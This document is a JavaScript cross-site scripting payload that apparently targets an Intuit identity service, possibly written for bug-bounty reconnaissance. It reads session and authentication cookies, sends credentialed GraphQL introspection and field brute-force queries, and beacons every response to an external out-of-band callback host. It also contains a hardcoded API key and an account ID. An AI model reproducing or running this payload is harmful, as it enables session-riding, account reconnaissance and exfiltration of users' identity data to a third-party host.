(function(){
try{
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var W='https://atmeta-wildcard-monitor.nasseurpay.workers.dev/?url=';
var G='https://api.guerrillamail.com/ajax.php';
var out=[];

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}
function beacon(tag,data){(new Image).src=O+'/'+tag+'?d='+encodeURIComponent((data||'').substring(0,900))}
function render(){
try{
if(!document.body){document.documentElement.appendChild(document.createElement('body'))}
document.body.innerHTML='<pre style="font:13px monospace;background:#111;color:#0f0;padding:20px;white-space:pre-wrap">'+out.join('\n')+'</pre>';
}catch(e){}
}
function log(msg){out.push(msg);render()}
function uuid(){return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;return(c==='x'?r:r&3|8).toString(16)})}

var session=gc('ius_session');
var visitorId=gc('ivid');
var authId=gc('qbn.authid');

log('[*] XSS on '+location.origin);
log('[*] Schema discovery build');
log('');

var hdrs={
'Content-Type':'application/json',
'authorization':'Intuit_APIKey intuit_apikey=prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE, intuit_apikey_version=1.0',
'intuit_routingid':authId||'9411838656613390',
'intuit_offeringid':'Intuit.cto.iam.ius',
'intuit_intentassetalias':'Intuit.cto.iam.ius',
'intuit_sessionid':session,
'intuit_profilingid':session,
'intuit_visitorid':visitorId,
'intuit_flowid':uuid(),
'intuit_tid':uuid()
};

function gql(q){
return fetch('/identity-api/v2/graphql',{
method:'POST',headers:hdrs,credentials:'include',
body:JSON.stringify({query:q})
}).then(function(r){return r.text()})
}

log('[1] __type introspection on DigitalIdentity...');
gql('{__type(name:"DigitalIdentity"){fields{name type{name kind ofType{name}}}}}')
.then(function(r){
log('[1] '+r.substring(0,500));
beacon('p29-type-di',r.substring(0,900));

log('[2] __type on Account...');
return gql('{__type(name:"Account"){fields{name type{name kind ofType{name}}}}}')
}).then(function(r){
log('[2] '+r.substring(0,500));
beacon('p29-type-acct',r.substring(0,900));

log('[3] __type on UpdateEmailAddressInput...');
return gql('{__type(name:"UpdateEmailAddressInput"){inputFields{name type{name kind ofType{name}}}}}')
}).then(function(r){
log('[3] '+r.substring(0,500));
beacon('p29-type-uea',r.substring(0,900));

log('[4] __type on GetProfileInput...');
return gql('{__type(name:"GetProfileInput"){inputFields{name type{name kind ofType{name}}}}}')
}).then(function(r){
log('[4] '+r.substring(0,500));
beacon('p29-type-gpi',r.substring(0,900));

log('[5] Brute-force fields on digitalIdentity...');
return gql('query{digitalIdentity{__typename legacyAuthId pseudonymId personId accountId userId profiles person accounts email name contactInfo personInfo profileId authId federationId}}')
}).then(function(r){
log('[5] '+r.substring(0,600));
beacon('p29-di-brute1',r.substring(0,900));

log('[6] More fields on digitalIdentity...');
return gql('query{digitalIdentity{__typename account profile identityId digitalIdentityId puid uid realmId namespaceId tid}}')
}).then(function(r){
log('[6] '+r.substring(0,600));
beacon('p29-di-brute2',r.substring(0,900));

log('[7] Fields on Account...');
return gql('query{account(input:{id:"9411838656613390"}){__typename name email profiles person profile contactInfo userId authId personId profileId}}')
}).then(function(r){
log('[7] '+r.substring(0,600));
beacon('p29-acct-brute',r.substring(0,900));

log('[8] More Account fields...');
return gql('query{account(input:{id:"9411838656613390"}){__typename id accountId createdDate status type roles features products subscriptions namespaceId realmId primaryUser}}')
}).then(function(r){
log('[8] '+r.substring(0,600));
beacon('p29-acct-brute2',r.substring(0,900));

log('[9] __type on Query root...');
return gql('{__type(name:"Query"){fields{name}}}')
}).then(function(r){
log('[9] '+r.substring(0,800));
beacon('p29-type-query1',r.substring(0,900));
beacon('p29-type-query2',r.substring(900,1800));

log('Done.');
beacon('p29-done','ok');
})
.catch(function(err){
log('[!] ERROR: '+err.message);
beacon('p29-err',err.message);
});

}catch(e){
(new Image).src='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun/p29-crash?e='+encodeURIComponent(e.message);
}
})();
